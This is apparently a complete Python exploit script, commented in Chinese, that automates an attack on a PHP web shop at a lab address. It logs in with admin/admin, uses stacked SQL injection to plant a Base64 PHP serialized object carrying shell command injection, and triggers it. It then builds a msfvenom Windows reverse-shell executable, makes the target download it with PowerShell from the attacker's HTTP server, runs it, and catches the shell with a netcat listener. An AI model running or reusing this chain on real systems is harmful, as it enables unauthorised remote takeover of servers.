import argparse
import requests
import base64
from bs4 import BeautifulSoup
import subprocess
import time
import threading

# 功能模組

# 步驟 1: 構造序列化資料並進行 Base64 編碼
def create_payload(remote_cmd):
    # 計算 remote_cmd 的字元長度
    cmd_length = len(remote_cmd) + 14
    print(f"[+] remote_cmd: {remote_cmd} {cmd_length}", len(remote_cmd))
        
    # 動態替換 serialized_data 中的 46 為 cmd_length \'顯示單引號 \x00顯示空格
    serialized_data = (
        f'O:9:"ApiTester":2:{{'
        f's:2:"ip";s:9:"127.0.0.1";'
        f's:14:"\x00ApiTester\x00res";s:{cmd_length}:"\' && {remote_cmd} && echo\'";}}'
    )
    
    # Base64 編碼
    encoded_data = base64.b64encode(serialized_data.encode()).decode()
    print("[+] Serialized Data:")
    print(serialized_data)
    print("[+] Base64 Encoded Payload:")
    print(encoded_data)
    return encoded_data

# 步驟 2: 利用 SQL Injection 插入惡意資料
def inject_payload(target_url, encoded_payload, cookies=None):
    injection_url = f"{target_url}?page=product_info.php&id=1;"
    injection_payload = (
        f"INSERT INTO products (name, description, category, price, attributes) "
        f"VALUES ('evil31', 'evil', 'evil', 0.00, FROM_BASE64('{encoded_payload}'))"
    )
    response = requests.get(injection_url + injection_payload, cookies=cookies)
    if response.status_code != 200:
        print("[+] Payload Injected Successfully!")
    else:
        print("[-] Injection Failed!")
    return response.status_code == 200

def get_id(target_url, cookies=None):
    get_id_url = f"{target_url}?page=products.php"
    resp = requests.get(get_id_url, cookies=cookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    #print(soup)
    # 查找所有匹配的 <a> 標籤
    all_links = soup.find_all('a', class_='btn btn-info btn-sm')

    # 確保有結果，並提取最後一個
    if all_links:
        last_link = all_links[-1]  # 取最後一個
        href = last_link.get('href')
        #print("最後一個連結：", href)
        if href and "id=" in href:
            # 解析 id 值
            id_value = href.split("id=")[-1]  # 提取 id 後的內容
            print("[+] 提取的 id 值：", id_value)
            return id_value
        else:
            print("[-] 未找到id值")
    else:
        print("[-] 未找到指定的標籤")

# 步驟 3: 構造觸發 URL 執行指令
def trigger_payload(target_url, product_id, cookies=None):
    trigger_url = f"{target_url}?page=product_info.php&id={product_id}"
    response = requests.get(trigger_url, cookies=cookies)
    if response.status_code != 200:
        print("[+] Payload Triggered Successfully!")
        #print(response.text)
    else:
        print("[-] Trigger Failed!")
    return response

# 啟動 HTTP 伺服器
def start_http_server(port=8080, directory="."):
    print(f"啟動 HTTP 伺服器，端口：{port}，目錄：{directory}")
    process = subprocess.Popen(
        ["python", "-m", "http.server", str(port), "--directory", directory],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    return process

# 關閉 HTTP 伺服器
def stop_http_server(process):
    print("關閉 HTTP 伺服器")
    process.terminate()  # 停止伺服器
    process.wait()       # 等待進程結束

# 產生木馬
def generate_payload(lhost, lport, output_file):
    # msfvenom 命令
    cmd = [
        "msfvenom",
        "-p", "windows/x64/shell_reverse_tcp",  # 載荷類型
        f"LHOST={lhost}",                      # 反向連接 IP
        f"LPORT={lport}",                      # 反向連接端口
        "-f", "exe",                           # 輸出格式
        "-o", output_file                      # 輸出文件名
    ]

    try:
        print(f"執行指令：{' '.join(cmd)}")
        # 執行命令
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print("Payload 生成成功！")
        print("輸出：", result.stdout)
    except subprocess.CalledProcessError as e:
        print("生成 Payload 時發生錯誤：")
        print(e.stderr)

# netcat監聽
def start_netcat_listener(port):
    try:
        print(f"[+] Starting Netcat listener on {port}...")
        # 呼叫 netcat 啟動監聽
        subprocess.run(["nc", "-lvnp", str(port)], check=True)
    except KeyboardInterrupt:
        print("\n[!] Listener stopped.")
    except FileNotFoundError:
        print("[-] Netcat (nc) is not installed. Please install it and try again.")
    except Exception as e:
        print(f"[-] Error: {e}")

# 主程式入口
if __name__ == "__main__":
    # 命令列參數解析
    parser = argparse.ArgumentParser(description="Automate an attack sequence with SQL Injection and RCE.")
    parser.add_argument("-u", "--url", required=True, help="Target URL of the application.")
    parser.add_argument("-l", "--lhost", required=True, help="localhost IP")
    args = parser.parse_args()

    # 提取參數
    TARGET_URL = args.url
    LOCAL_IP = args.lhost
  
    print("[*] Starting Attack Automation...")

    # 創建會話
    session = requests.Session()

    # 第一次請求：登入或訪問設置 Cookies 的頁面
    login_url = "http://192.168.139.129/shop/dashboard/login.php"
    login_data = {
        "username": "admin",
        "password": "admin"
    }
    response = session.post(login_url, data=login_data)
    # 打印 Cookies
    print("Cookies after login:")
    print(session.cookies.get_dict())
    COOKIES=session.cookies.get_dict()

    sport = "8777"
    lport = "7778"
    output_file = "res1.exe"
    
    # 產生惡意檔案
    generate_payload(LOCAL_IP, lport, output_file)

    # 啟動伺服器
    server_process = start_http_server(sport, directory=".")

    # 1. 抓取惡意檔案
    get_file = f"powershell wget {LOCAL_IP}:{sport}/{output_file} -O C:/logs/{output_file}"
    payload = create_payload(get_file)
    inject_payload(TARGET_URL, payload, cookies=COOKIES)
    product_id = get_id(TARGET_URL, cookies=COOKIES)
    trigger_payload(TARGET_URL, product_id, cookies=COOKIES)
    
    # 關閉伺服器
    stop_http_server(server_process)
    
    # 啟動 Netcat 的執行緒
    listener_thread = threading.Thread(target=start_netcat_listener, args=(lport,))
    listener_thread.start()
    time.sleep(2)

    # 2. 執行惡意檔案
    payload = create_payload(f"C:/logs/{output_file}")
    inject_payload(TARGET_URL, payload, cookies=COOKIES)
    product_id = get_id(TARGET_URL, cookies=COOKIES)
    trigger_payload(TARGET_URL, product_id, cookies=COOKIES)
    
    listener_thread.join()
